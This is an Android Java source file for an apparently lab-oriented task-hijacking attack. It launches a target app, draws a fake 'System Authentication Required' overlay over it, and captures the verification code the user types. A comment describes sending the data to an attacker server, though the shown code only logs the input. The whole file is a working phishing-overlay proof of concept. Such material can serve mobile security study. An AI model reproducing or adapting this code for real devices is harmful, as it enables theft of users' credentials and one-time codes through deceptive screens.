package com.example.taskhijacker;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

public class HijackActivity extends Activity {

    private static final String TARGET_PACKAGE = "com.example.intetn_redirect_vuln";
    private static final String TAG = "TaskHijacker";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH);
        getWindow().setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY);

        launchTargetApp();
        new Handler().postDelayed(this::showOverlay, 1500);
    }

    private void launchTargetApp() {
        try {
            Intent launchIntent = getPackageManager().getLaunchIntentForPackage(TARGET_PACKAGE);
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
                        Intent.FLAG_ACTIVITY_CLEAR_TASK);
                startActivity(launchIntent);
            } else {
                Log.e(TAG, "Target app not found: " + TARGET_PACKAGE);
                finish();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error launching target app", e);
            finish();
        }
    }

    private void showOverlay() {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(0xFFEEEEEE);

        TextView title = new TextView(this);
        title.setText("System Authentication Required");
        title.setTextSize(20);
        title.setPadding(20, 40, 20, 20);

        EditText input = new EditText(this);
        input.setHint("Enter verification code");
        input.setPadding(20, 20, 20, 20);

        layout.addView(title);
        layout.addView(input);

        input.setOnEditorActionListener((v, actionId, event) -> {
            captureInput(input.getText().toString());
            return true;
        });

        setContentView(layout);
    }

    private void captureInput(String userInput) {
        // Send captured data to attacker server
        new Thread(() -> {
            try {
                Log.d(TAG, "Captured input: " + userInput);

                runOnUiThread(this::finish);
            } catch (Exception e) {
                Log.e(TAG, "Exfiltration failed", e);
            }
        }).start();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        new Handler().postDelayed(this::launchTargetApp, 500);
    }
}